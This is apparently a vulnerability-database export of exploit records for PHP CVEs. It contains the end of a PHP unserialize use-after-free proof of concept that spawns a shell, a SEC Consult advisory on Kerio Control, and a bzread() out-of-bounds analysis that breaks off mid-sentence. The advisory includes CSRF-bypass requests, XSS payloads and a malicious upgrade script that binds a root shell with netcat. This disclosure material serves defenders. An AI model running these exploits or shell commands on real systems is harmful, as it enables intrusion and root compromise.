'a:3:{i:0;O:12:\"DateTimeZone\":2:{s:13:\"timezone_type\";a:1:{i:0;i:1;}s:8:\"timezone\";s:3:\"UTC\";}i:1;s:'.strlen($fakezval1).':\"'.$fakezval1.'\";i:2;a:1:{i:0;R:4;}}';  \n  \n$x = unserialize($data1);  \n$y = $x[2];  \n  \n// zend_eval_string()'s address  \n$y[0][0] = \"\\x6d\";  \n$y[0][1] = \"\\x1e\";  \n$y[0][2] = \"\\x35\";  \n$y[0][3] = \"\\x00\";  \n$y[0][4] = \"\\x01\";  \n$y[0][5] = \"\\x00\";  \n$y[0][6] = \"\\x00\";  \n$y[0][7] = \"\\x00\";  \n  \n$fakezval2 = ptr2str(0x3b296324286624); // $f($c);  \n$fakezval2 .= ptr2str(0x100b83000);  \n$fakezval2 .= \"\\x00\\x00\\x00\\x00\";  \n$fakezval2 .= \"\\x05\";  \n$fakezval2 .= \"\\x00\";  \n$fakezval2 .= \"\\x00\\x00\";  \n  \n$data2 = 'a:3:{i:0;O:12:\"DateTimeZone\":2:{s:13:\"timezone_type\";a:1:{i:0;i:1;}s:8:\"timezone\";s:3:\"UTC\";}i:1;s:'.strlen($fakezval2).':\"'.$fakezval2.'\";i:2;O:12:\"DateTimeZone\":2:{s:13:\"timezone_type\";a:1:{i:0;R:4;}s:8:\"timezone\";s:3:\"UTC\";}}';  \n  \n$z = unserialize($data2);  \n  \nfunction ptr2str($ptr)  \n{  \n$out = \"\";  \nfor ($i=0; $i<8; $i++) {  \n$out .= chr($ptr & 0xff);  \n$ptr >>= 8;  \n}  \nreturn $out;  \n}  \n  \n?>  \n```  \n  \nTest the PoC on the command line, then any PHP code can be executed:  \n  \n```  \n$ lldb php  \n(lldb) target create \"php\"  \nCurrent executable set to 'php' (x86_64).  \n(lldb) run uafpoc.php assert \"system\\('sh'\\)==exit\\(\\)\"  \nProcess 13472 launched: '/usr/bin/php' (x86_64)  \nsh: no job control in this shell  \nsh-3.2$ php -v  \nPHP 5.5.14 (cli) (built: Sep 9 2014 19:09:25)  \nCopyright (c) 1997-2014 The PHP Group  \nZend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies  \nsh-3.2$ exit  \nexit  \nProcess 13472 exited with status = 0 (0x00000000)  \n(lldb)  \n```  \n  \n  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:130471"
        }
    ],
    "CVE-2016-5773": [
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2016-09-22T00:00:00",
            "published": "2016-09-22T00:00:00",
            "href": "https://packetstormsecurity.com/files/138812/Kerio-Control-Unified-Threat-Management-Code-Execution-XSS-Memory-Corruption.html",
            "id": "PACKETSTORM:138812",
            "type": "packetstorm",
            "title": "Kerio Control Unified Threat Management Code Execution / XSS / Memory Corruption",
            "sourceData": "`SEC Consult has also released a blog post describing the attack scenarios  \nof the vulnerabilities within this advisory in detail and a video which  \nshows the remote attack. Exploit code has been developed as well but will  \nnot be released for now.  \n  \nBlog:  \nhttp://blog.sec-consult.com/2016/09/controlling-kerio-control-when-your.html  \n  \nVideo:  \nhttps://www.youtube.com/watch?v=y_OWz25sHMI  \n  \n  \nSEC Consult Vulnerability Lab Security Advisory < 20160922-0 >  \n=======================================================================  \ntitle: Potential backdoor access through multiple vulnerabilities  \nproduct: Kerio Control Unified Threat Management  \nvulnerable version: <9.1.3, verified in version 9.1.0 build 1087 and 9.1.1  \nbuild 1324  \nfixed version: 9.1.3 (partially fixed, see vendor statement below)  \nCVE number: -  \nimpact: critical  \nhomepage: http://www.kerio.com/  \nfound: 2016-08-24  \nby: R. Freingruber (Office Vienna)  \nR. Tavakoli (Office Vienna)  \nSEC Consult Vulnerability Lab  \n  \nAn integrated part of SEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nhttps://www.sec-consult.com  \n  \n=======================================================================  \n  \nVendor description:  \n-------------------  \n\"Protect your network from viruses, malware and malicious activity  \nwith Kerio Control, the easy-to-administer yet powerful all-in-one  \nsecurity solution.  \nKerio Control brings together next-generation firewall capabilities -  \nincluding a network firewall and router, intrusion detection and  \nprevention (IPS), gateway anti-virus, VPN, and web contentand  \napplication filtering. These comprehensive capabilities and unmatched  \ndeployment flexibility make Kerio Control the ideal choice for small  \nand mid-sized businesses.\"  \n  \nSource: http://www.kerio.com/products/kerio-control  \n  \n  \nBusiness recommendation:  \n------------------------  \nBy combining the vulnerabilities documented in this advisory an attacker  \ncan fully compromise a network which uses the Kerio Control appliance for  \nprotection.  \n  \nThe attacker can trick a victim to visit a malicious website which then conducts  \nthe internal attack. The attacked victim must be logged in or weak credentials  \nmust be configured which can be found with a bruteforce attack.  \n  \nThe attacker will gain a reverse root shell from the Internet to the internal  \nKerio Control firewall system. Moreover, it's possible that an internal attacker  \nuses the described vulnerabilities to escalate his privileges (low privileged  \naccount to full root shell) to steal credentials from other users on the UTM  \nappliance.  \n  \nMost vulnerabilities (RCE, CSRF bypasses, XSS, Heap Spraying) were found  \nin just two PHP scripts. Both scripts are not referenced by any other  \nPHP script nor by any binary on the system.  \nBoth scripts contain a different(!), seemingly deliberate(?) CSRF bypass  \nwhich make the vulnerabilities exploitable from the Internet to obtain a  \nreverse root shell.  \n  \nSEC Consult recommends not to use Kerio Control until a thorough security  \nreview has been performed by security professionals and all identified  \nissues have been resolved.  \n  \n  \nVulnerability overview/description:  \n-----------------------------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nAn authenticated user (standard user or administrator) can control data, which  \ngets later unserialized. Kerio Control uses PHP 5.2.13 which was released on  \n2010-02-25. This version is more than 6 years old and several bugs were found  \nin the meantime within the unserialize function. The following CVE numbers  \nare just some examples for vulnerabilities in unserialize which lead to remote  \ncode execution:  \n-) CVE-2014-8142  \n-) CVE-2014-3515  \n-) CVE-2015-0231  \n-) CVE-2015-6834  \n-) CVE-2016-5771  \n-) CVE-2016-5773  \n  \nPHP 5.2.13 is especially affected by CVE-2014-3515. This vulnerability uses a  \ntype confusion attack to trigger a use-after-free vulnerability. It can be used  \nto read data and get full code execution. In the case of Kerio Control the  \nresult of unserialize is not reflected back to the attacker. It's therefore not  \npossible to read memory from the stack or heap (e.g. to bypass ASLR).  \n  \nNevertheless, SEC Consult developed a fully working and reliable (blind) exploit  \nfor this vulnerability which spawns a reverse root shell to the Kerio Control  \nsystem.  \nFor this exploit a user account is required. However, it's also possible to  \nconduct the attack via the Internet because the CSRF (Cross Site Request  \nForgery) check can be bypassed (see below).  \n  \nAn attacker can use this vulnerability to break into a company network via the  \nInternet by tricking a logged in user to visit a malicious website. Even if the  \nuser is currently not logged in the attacker can start a bruteforce attack to  \nobtain valid credentials to conduct the attack.  \n  \n  \n2) PHP script allows heap spraying  \nOne of the PHP scripts allows the allocation of memory inside the main binary  \n(winroute) of Kerio Control. Winroute contains the code of most services  \n(e.g. the webserver, PHP, network related functionality, ...).  \nThe memory will not be freed after finishing the request and can therefore be  \nused to spray payloads to the whole memory space.  \n  \nThis vulnerability was used in the overall exploit to defeat ASLR.  \nPlease bear in mind that it's very likely that an attacker can write a working  \nexploit without heap spraying. Fixing this vulnerability would therefore not  \nprevent the exploitation of the remote code execution vulnerability.  \nFor example, the information disclosure vulnerability from this advisory can  \nbe used to bypass ASLR as well. This would eliminate the need of heap spraying.  \n  \n  \n3) CSRF Protection Bypass  \nThe PHP scripts contain code to protect against CSRF (Cross Site Request  \nForgery) attacks. Because of the wrong usage of PHP binary  \noperations and comparisons it's possible to bypass this check. That means  \nthat an attacker can trigger requests from other websites which will be handled  \nby Kerio Control. This vulnerability allows to exploit the remote code  \nexecution vulnerability from the Internet to break into a network.  \n  \n  \n4) Webserver running with root privileges  \nThe main binary (which contains the webserver and PHP) runs with root  \nprivileges.  \n  \nKerio told SEC Consult that this vulnerability will not be fixed. SEC  \nConsult strongly recommended otherwise.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nKerio Control does not properly encode parameters which are reflected on the  \nwebsite. This leads to cross site scripting vulnerabilities.  \nAn attacker can abuse these vulnerabilities to modify the website or do actions  \nin the context of the attacked user.  \n  \n  \n6) Missing memory corruption protections  \nThe main binary (winroute) is not compiled as position-independent executable  \n(PIE). This allowed the use of ROP (return-oriented-programming) code to  \nbypass the not executable heap. Moreover, the stack is per default marked as  \nexecutable, but the exact location of the stack is randomized by ASLR.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nOne of the PHP scripts leaks pointers to the stack and heap.  \nThis can be abused by attackers to bypass ASLR.  \nBecause stacks are marked as executable an attacker can therefore easily bypass  \nASLR and DEP/NX.  \n  \n  \n8) Remote Code Execution as administrator  \nNearly a year ago on 2015-10-12 Raschin Tavakoli reported a remote code  \nexecution vulnerability in the administrative web interface in the upgrade  \nfunctionality. This vulnerability is still unfixed, only the associated XSS  \nvulnerability was fixed. However, an attacker can still exploit it from the  \nInternet, e.g. by abusing the XSS vulnerability described in this advisory  \n(where the CSRF check can be bypassed).  \n  \nWith this vulnerability an attacker can gain a reverse root shell on  \nKerio Control again if a logged in administrator visits a malicious website  \non the Internet.  \nMore information can also be found in the old advisory:  \nhttps://www.exploit-db.com/exploits/38450/  \n  \n  \n9) Login not protected against brute-force attacks  \nThere are no bruteforce protections in place for the login.  \nIf an unauthenticated victim visits an attacker's website, the attacker can  \nstart a bruteforce attack to obtain valid credentials to execute the  \nremote code execution exploit. Via image-loading the attacker can detect if  \nthe current credentials are valid (without violating SOP).  \n  \n  \nProof of concept:  \n-----------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nThe following request can be used to set the unserialize data. In this example  \na faked string is used which points to 0xffffffff (kernel memory). Unserializing  \nit will therefore crash the remote webserver (the winroute process).  \n  \nPOST /set.php HTTP/1.1  \nHost: $IP:4081  \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \nContent-Type: application/x-www-form-urlencoded  \nContent-Length: 730  \n  \nk_securityHash=x&target=k_sessionVariable&k_variable=lastDisplayed&k_value=a:18:{s:8:\"k_dbName\";s:5:\"error\";s:11:\"k_dbSummara\";s:3:\"abc\";s:14:\"k_dbIndividual\";s:3:\"abc\";s:16:\"k_dbLastUsedType\";s:3:\"abc\";s:10:\"k_dbLayout\";s:3:\"abc\";s:10:\"k_pageType\";s:3:\"abc\";s:13:\"k_periodStart\";i:123;s:11:\"k_periodEnd\";i:123;s:8:\"k_userId\";i:123;s:6:\"tabBar\";i:123;s:13:\"k_gotoElement\";i:123;s:9:\"k_protoId\";i:123;s:11:\"k_errorType\";i:123;s:16:\"k_timezoneOffset\";i:123;s:9:\"k_groupId\";i:123;s:2:\"id\";i:123;s:11:\"k_dbSummary\";C:16:\"SplObjectStorage\":152:{x:i:2;O:8:\"stdClass\":1:{i:0;a:2:{i:1;i:1;i:2;i:2;}};d:2.0851592721051977e-262;;m:a:2:{i:0;S:15:\"\\ff\\ff\\ff\\ff\\20\\00\\00\\00\\01\\00\\00\\00\\06\\00\\00\";i:1;R:3;}}s:18:\"k_historyTimestamp\";s:3:\"abc\";}  \n  \nThe following request will call unserialize on the injected data:  \n  \nGET /contentLoader.php?k_getHistoryId=1&k_securityHash=x HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nIn the example above only a denial of service will be conducted. However, an  \nattacker can change the data type to object to get full code execution on  \nthe remote system.  \n  \nSEC Consult developed a fully working exploit for this attack which spawns a  \nroot shell. Please note that this exploit was intentionally written to just  \ntarget Kerio Control 9.1.0 Build 1087. This is because hardcoded offsets  \nare used which belong to the winroute binary with the SHA256 hash:  \n2808c35528b9a4713b91f65a881dfca03088de08b6331fdee1c698523bd757b0  \nThis exploit will not be released for now.  \n  \nA real-world-attacker can detect the remote binary version by bruteforcing  \nthe object handler related to CVE-2014-3515.  \n  \n  \n2) PHP script allows heap spraying  \nThe set.php script contains the following code:  \n$p_variable = urldecode($_POST['k_variable']);  \n$p_value = urldecode($_POST['k_value']);  \n...  \n$p_session->setSessionVariable($p_variable, $p_value);  \n  \nPOST requests with the following parameters can therefore be used to allocate  \nspace on the remote system:  \nk_securityHash=x&target=k_sessionVariable&k_variable=<random_name>  \n&k_value=<payload_to_allocate>  \n  \nDuring tests it was possible to spray approximately 400 MB data in 30 seconds  \nwhich is enough to control two predictable addresses on the heap.  \n  \n  \n3) CSRF Protection Bypass  \nTwo scripts are required for the remote code execution exploit:  \n-) set.php  \n-) ContentLoader.php  \nBoth scripts contain different very interesting CSRF check bypasses.  \n  \nThe following code can be found in set.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'] || $_POST['k_securityHash'];  \nif ('' == $p_postedHash || ($p_postedHash != $p_securityHash)) {  \nexit();  \n}  \n  \nSince the programming language is PHP (and not JavaScript), the above code code  \ndoes not work as expected. $p_postedHash can only become 0 or 1 because || is a  \nlogical operator. The if-condition compares the valid token with the posted one  \nvia the != operator, however, this will not check if types are the same.  \nIf k_securityHash is set (either via GET or POST) to any value, the above code  \nwill compare the number 1 with a string, which will always bypass the check.  \nIt's therefore enough to set k_securityHash to any value to bypass the CSRF  \nprotection.  \n  \nThe following code can be found in contentLoader.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'];  \n...  \nif (!$p_session || ('' == $p_postedHash && $p_postedHash != $p_securityHash)) {  \n$p_page = new p_Page();  \n$p_page->p_jsCode('window.top.location = \"index.php\";');  \n$p_page->p_showPageCode();  \ndie();  \n}  \n  \nNow the programmers only use the GET parameter, however, they changed the  \nlogical operator in the if condition from || to && which means that the CSRF  \ncheck will only be applied if $p_postedHash is empty. It's therefore again  \nenough to set k_securityHash to any value to bypass the check.  \n  \n  \n4) Webserver running with root privileges  \nNo proof of concept necessary.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nIn the following request the k_historyTimestamp parameter is prone to XSS:  \nhttps://<IP>:4081/contentLoader.php?k_dbName=x&k_securityHash=x  \n&k_historyTimestamp=aa%22;alert(1)%3b//  \n  \nIn the same request the id parameter can be used to inject JavaScript code.  \nNote that the attack can only be conducted against administrative users.  \nUsers with standard privileges can only access pages with k_dbName set to one  \nof the following values:  \n-) accStats  \n-) prefs  \n-) dialup  \n-) error  \n  \nIn such a case Kerio Control adds code like the following  \n(in this example k_dbName=dialup):  \nvar k_newDbName = \"<kerio:text id=\"tabCaption_dialup\"/>\";  \n  \nThe \" characters within the string are not correctly encoded.  \nThis will lead to the termination of the JavaScript execution. Because the  \ninjected payload is stored after this code, the attacker must bypass this  \ncode to ensure that the payload gets executed. This is only possible if  \nthe attacked user is an administrator because administrators can load any  \ndbName. By setting k_dbName to an invalid dbName (e.g. to 'x'), code like  \nthe following will be added instead (which does not crash):  \nvar k_newDbName = \"\";  \n  \nAnother XSS can be found at:  \nhttps://<IP>:4081/admin/internal/dologin.php?hash=%0D%0A\"><script>alert(1);</script><!--  \n  \n  \n6) Missing memory corruption protections  \nNo proof of concept necessary.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nThe following request returns information to the currently logged in user  \n(e.g. session token and username):  \n  \nGET /nonauth/getLoginType.js.php HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nThe following is a typical response:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 11:47:34 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginUnlock\";k_loginParams.k_nonauthToken =  \n\"0xb59066a8\";k_loginParams.k_sessionToken =  \n\"bc7c9ae78f01e498b7c935b4ad521b664d4e2c5574bde30cdf57851a58763660\";k_loginParams.k_loggedUser  \n= {k_asocName: \"user\", k_fullName: \"user\"};  \n  \nThe above response contains a valid pointer (0xb59066a8). In most cases this  \npointer will point to the heap. However, sometimes this pointer will point  \ninto a readable and writeable region behind a stack-region.  \nThe target location always stores the same data. During the analysis no  \nfurther effort was spent on analysing this behaviour.  \n  \nThe pointer will also be disclosed if the user is already logged out.  \nIn such a case the response looks like:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 12:04:44 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginCommon\";k_loginParams.k_nonauthToken =  \n\"0xb2ee208\";  \n  \n  \nAn attack scenario can be:  \n-) The attacker tricks a victim to visit the attacker's malicious website  \n-) The attacker's website uses the CSRF bypass and the identified XSS  \nvulnerability to embed a malicious script inside the Kerio Control website  \n-) The attacker's website iframes the Kerio Control website to trigger the  \nexecution of the XSS payload  \n-) The XSS payload runs on the same domain and can therefore send requests  \nand read responses. This means the attacker can send requests to  \ngetLoginType.js.php to obtain a memory pointer.  \n-) If the memory pointer is within a specific range (e.g. the highest nibble  \nis zero), it's a pointer to the heap. In such a case the RCE vulnerability  \ncan be used to crash and restart the server. After that the same check can  \nbe done again.  \n-) If the memory pointer points near a stack (highest nibble is 0xb), the  \npointer can be used to calculate the base address of a stack.  \n-) Now the attacker knows the location of a stack (all stacks are marked as  \nreadable, writeable and executable). He can now easily bypass ASLR and DEP.  \n  \n  \n8) Remote Code Execution as administrator  \nAn attacker can create a malicious upgrade image with the following  \ncommands:  \ncat upgrade.sh  \n#!/bin/bash  \nnc -lp 9999 -e /bin/bash &  \n  \ntar czf upgrade.tar.gz *  \nmv upgrade.tar.gz upgrade.img  \n  \nThe image can be uploaded in the administrative web interface.  \nThis will bind a root shell on port 9999. The complete attack can also be  \nconducted via the cross site scripting vulnerability described in this  \nadvisory (XSS in contentLoader.php). This enables an attacker to conduct  \nthe attack from the Internet to obtain a reverse shell on Kerio Control.  \n  \n  \n9) Login not protected against brute-force attacks  \nValid credentials can be obtained via a brute-force attack.  \nIt's enough to send a POST request to /internal/dologin.php with the  \nparameters kerio_username and kerio_password set. A remote attacker  \ncan detect if the credentials are correct without reading the  \nresponse (SOP would not allow to read the response). This is possible  \nbecause /internal/photo will only return a valid image if the user is  \ncurrently logged in. The attacker can load an image from this URL and  \ncheck if loading was successful to leak the information if the  \ncredentials are valid or not.  \nThe following code demonstrates this:  \n<img src=\"https://<Kerio-IP>/internal/photo\" onerror=not_logged_in();  \nonload=logged_in();></img>  \n  \n  \nVulnerable / tested versions:  \n-----------------------------  \nThe following product versions were found to be vulnerable which were the  \nlatest versions available at the time of the discovery:  \nv9.1.0 (Build 1087)  \nv9.1.1 (Build 1324)  \n  \n  \nVendor contact timeline:  \n------------------------  \n2016-08-29: Contacting vendor through website  \n(bug report: bugreports@support.kerio.com) Ticket-ID: MYW-768664  \n2016-08-31: No answer, contacting CTO of Kerio via email  \n2016-09-01: Received security contact with PGP & S/MIME certificate  \n2016-09-01: Transmission of PGP encrypted advisory to Kerio  \n2016-09-09: Received answer, Kerio confirms vulnerabilities 1,2,3,5,6,7  \nStatement to vulnerability 9:  \n\"the feature already is in the product.\"  \nStatement to vulnerabilities 4 (Webserver running with root  \nprivileges) and 8 (Remote Code Execution as administrator):  \n\"I do not consider this a vulnerability\"  \nUpdate including a fix will be available on 2016-09-20  \n2016-09-09: SEC Consult informed Kerio to re-think the decision  \nnot fixing the vulnerabilities 4, 8 and 9  \nSEC Consult highly recommends to fix all reported issues  \n2016-09-13: SEC Consult informed Kerio that the advisory will be  \nreleased on 2016-09-22  \n2016-09-20: Kerio releases patch for Kerio Control  \n2016-09-22: Coordianted release of security advisory  \n  \n  \nSolution:  \n---------  \nThe vendor has released version 9.1.3 on 20th September which, according  \nto the vendor, fixes the vulnerabilities 1,2,3,5,6,7.  \n  \nThe vendor told us the following regarding vulnerability 9:  \n\"the feature already is in the product\"  \n  \nVulnerability 4 and 8 are not considered a vulnerability by the vendor  \nand will not be fixed.  \nSEC Consult strongly recommended fixing issue 4 and 8 as well.  \n  \nThe latest version can be downloaded from here:  \nhttp://www.kerio.com/support/kerio-control  \nhttp://www.kerio.com/support/kerio-control/release-history  \n  \n  \nWorkaround:  \n-----------  \nNone  \n  \n  \nAdvisory URL:  \n-------------  \nhttps://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm  \n  \n  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \n  \nSEC Consult Vulnerability Lab  \n  \nSEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nAbout SEC Consult Vulnerability Lab  \nThe SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It  \nensures the continued knowledge gain of SEC Consult in the field of network  \nand application security to stay ahead of the attacker. The SEC Consult  \nVulnerability Lab supports high-quality penetration testing and the evaluation  \nof new offensive and defensive technologies for our customers. Hence our  \ncustomers obtain the most current information about vulnerabilities and valid  \nrecommendation about the risk profile of new technologies.  \n  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \nInterested to work with the experts of SEC Consult?  \nSend us your application https://www.sec-consult.com/en/Career.htm  \n  \nInterested in improving your cyber security with the experts of SEC Consult?  \nContact our local offices https://www.sec-consult.com/en/About/Contact.htm  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \n  \nMail: research at sec-consult dot com  \nWeb: https://www.sec-consult.com  \nBlog: http://blog.sec-consult.com  \nTwitter: https://twitter.com/sec_consult  \n  \nEOF R. Freingruber / @2016  \n  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:138812"
        }
    ],
    "CVE-2016-5399": [
        {
            "bulletinFamily": "exploit",
            "description": "PHP 7.0.8, 5.6.23 and 5.5.37 - bzread() Out-of-Bounds Write. CVE-2016-5399. Dos exploit for PHP platform",
            "modified": "2016-07-25T00:00:00",
            "published": "2016-07-25T00:00:00",
            "id": "EDB-ID:40155",
            "href": "https://www.exploit-db.com/exploits/40155/",
            "type": "exploitdb",
            "title": "PHP 7.0.8, 5.6.23 and 5.5.37 - bzread() Out-of-Bounds Write",
            "sourceData": "",
            "cvss": {
                "score": 0.0,
                "vector": "NONE"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:40155"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Exploit for php platform in category dos / poc",
            "modified": "2016-07-25T00:00:00",
            "published": "2016-07-25T00:00:00",
            "href": "https://0day.today/exploit/description/26098",
            "id": "1337DAY-ID-26098",
            "type": "zdt",
            "title": "PHP 7.0.8 / 5.6.23 / 5.5.37 - bzread() Out-of-Bounds Write",
            "sourceData": "'''\r\nPHP 7.0.8, 5.6.23 and 5.5.37 does not perform adequate error handling in\r\nits `bzread()' function:\r\n \r\nphp-7.0.8/ext/bz2/bz2.c\r\n,----\r\n| 364 static PHP_FUNCTION(bzread)\r\n| 365 {\r\n| ...\r\n| 382     ZSTR_LEN(data) = php_stream_read(stream, ZSTR_VAL(data), ZSTR_LEN(data));\r\n| 383     ZSTR_VAL(data)[ZSTR_LEN(data)] = '\\0';\r\n| 384\r\n| 385     RETURN_NEW_STR(data);\r\n| 386 }\r\n`----\r\n \r\nphp-7.0.8/ext/bz2/bz2.c\r\n,----\r\n| 210 php_stream_ops php_stream_bz2io_ops = {\r\n| 211     php_bz2iop_write, php_bz2iop_read,\r\n| 212     php_bz2iop_close, php_bz2iop_flush,\r\n| 213     \"BZip2\",\r\n| 214     NULL, /* seek */\r\n| 215     NULL, /* cast */\r\n| 216     NULL, /* stat */\r\n| 217     NULL  /* set_option */\r\n| 218 };\r\n`----\r\n \r\nphp-7.0.8/ext/bz2/bz2.c\r\n,----\r\n| 136 /* {{{ BZip2 stream implementation */\r\n| 137\r\n| 138 static size_t php_bz2iop_read(php_stream *stream, char *buf, size_t count)\r\n| 139 {\r\n| 140     struct php_bz2_stream_data_t *self = (struct php_bz2_stream_data_t *)stream->abstract;\r\n| 141     size_t ret = 0;\r\n| 142\r\n| 143     do {\r\n| 144         int just_read;\r\n| ...\r\n| 148         just_read = BZ2_bzread(self->bz_file, buf, to_read);\r\n| 149\r\n| 150         if (just_read < 1) {\r\n| 151             stream->eof = 0 == just_read;\r\n| 152             break;\r\n| 153         }\r\n| 154\r\n| 155         ret += just_read;\r\n| 156     } while (ret < count);\r\n| 157\r\n| 158     return ret;\r\n| 159 }\r\n`----\r\n \r\nThe erroneous return values for Bzip2 are as follows:\r\n \r\nbzip2-1.0.6/bzlib.h\r\n,----\r\n| 038 #define BZ_SEQUENCE_ERROR    (-1)\r\n| 039 #define BZ_PARAM_ERROR       (-2)\r\n| 040 #define BZ_MEM_ERROR         (-3)\r\n| 041 #define BZ_DATA_ERROR        (-4)\r\n| 042 #define BZ_DATA_ERROR_MAGIC  (-5)\r\n| 043 #define BZ_IO_ERROR          (-6)\r\n| 044 #define BZ_UNEXPECTED_EOF    (-7)\r\n| 045 #define BZ_OUTBUFF_FULL      (-8)\r\n| 046 #define BZ_CONFIG_ERROR      (-9)\r\n`----\r\n \r\nShould the invocation of BZ2_bzread() fail, the loop would simply be\r\nbroken out of (bz2.c:152) and execution would continue with bzread()\r\nreturning RETURN_NEW_STR(data).\r\n \r\nAccording to the manual [1], bzread() returns FALSE on error; however\r\nthat does not seem to ever happen.\r\n \r\nDue to the way that the bzip2 library deals with state, this could\r\nresult in an exploitable condition if a user were to call bzread() after\r\nan error, eg:\r\n \r\n,----\r\n| $data = \"\";\r\n| while (!feof($fp)) {\r\n|     $res = bzread($fp);\r\n|     if ($res === FALSE) {\r\n|         exit(\"ERROR: bzread()\");\r\n|     }\r\n|     $data .= $res;\r\n| }\r\n`----\r\n \r\n \r\nExploitation\r\n============\r\n \r\nOne way the lack of error-checking could be abused is through\r\nout-of-bound writes that may occur when `BZ2_decompress()' (BZ2_bzread()\r\n-> BZ2_bzRead() -> BZ2_bzDecompress() -> BZ2_decompress()) processes the\r\n`pos' array using user-controlled selectors as indices:\r\n \r\nbzip2-1.0.6/decompress.c\r\n,----\r\n| 106 Int32 BZ2_decompress ( DState* s )\r\n| 107 {\r\n| 108    UChar      uc;\r\n| 109    Int32      retVal;\r\n| ...\r\n| 113    /* stuff that needs to be saved/restored */\r\n| 114    Int32  i;\r\n| 115    Int32  j;\r\n| ...\r\n| 118    Int32  nGroups;\r\n| 119    Int32  nSelectors;\r\n| ...\r\n| 167    /*restore from the save area*/\r\n| 168    i           = s->save_i;\r\n| 169    j           = s->save_j;\r\n| ...\r\n| 172    nGroups     = s->save_nGroups;\r\n| 173    nSelectors  = s->save_nSelectors;\r\n| ...\r\n| 195    switch (s->state) {\r\n| ...\r\n| 286       /*--- Now the selectors ---*/\r\n| 287       GET_BITS(BZ_X_SELECTOR_1, nGroups, 3);\r\n| 288       if (nGroups < 2 || nGroups > 6) RETURN(BZ_DATA_ERROR);\r\n| 289       GET_BITS(BZ_X_SELECTOR_2, nSelectors, 15);\r\n| 290       if (nSelectors < 1) RETURN(BZ_DATA_ERROR);\r\n| 291       for (i = 0; i < nSelectors; i++) {\r\n| 292          j = 0;\r\n| 293          while (True) {\r\n| 294             GET_BIT(BZ_X_SELECTOR_3, uc);\r\n| 295             if (uc == 0) break;\r\n| 296             j++;\r\n| 297             if (j >= nGroups) RETURN(BZ_DATA_ERROR);\r\n| 298          }\r\n| 299          s->selectorMtf[i] = j;\r\n| 300       }\r\n| 301\r\n| 302       /*--- Undo the MTF values for the selectors. ---*/\r\n| 303       {\r\n| 304          UChar pos[BZ_N_GROUPS], tmp, v;\r\n| 305          for (v = 0; v < nGroups; v++) pos[v] = v;\r\n| 306\r\n| 307          for (i = 0; i < nSelectors; i++) {\r\n| 308             v = s->selectorMtf[i];\r\n| 309             tmp = pos[v];\r\n| 310             while (v > 0) { pos[v] = pos[v-1]; v--; }\r\n| 311             pos[0] = tmp;\r\n| 312             s->selector[i] = tmp;\r\n| 313          }\r\n| 314       }\r\n| 315\r\n| ...\r\n| 613    save_state_and_return:\r\n| 614\r\n| 615    s->save_i           = i;\r\n| 616    s->save_j           = j;\r\n| ...\r\n| 619    s->save_nGroups     = nGroups;\r\n| 620    s->save_nSelectors  = nSelectors;\r\n| ...\r\n| 640    return retVal;\r\n| 641 }\r\n`----\r\n \r\nbzip2-1.0.6/decompress.c\r\n,----\r\n| 070 #define GET_BIT(lll,uuu)                          \\\r\n| 071    GET_BITS(lll,uuu,1)\r\n`----\r\n \r\nbzip2-1.0.6/decompress.c\r\n,----\r\n| 043 #define GET_BITS(lll,vvv,nnn)                     \\\r\n| 044    case lll: s->state = lll;                      \\\r\n| 045    while (True) {                                 \\\r\n| ...\r\n| 065    }\r\n`----\r\n \r\nIf j >= nGroups (decompress.c:297), BZ2_decompress() would save its\r\nstate and return BZ_DATA_ERROR.  If the caller don't act on the\r\nerroneous retval, but rather invokes BZ2_decompress() again, the saved\r\nstate would be restored (including `i' and `j') and the switch statement\r\nwould transfer execution to the BZ_X_SELECTOR_3 case -- ie. the\r\npreceding initialization of `i = 0' and `j = 0' would 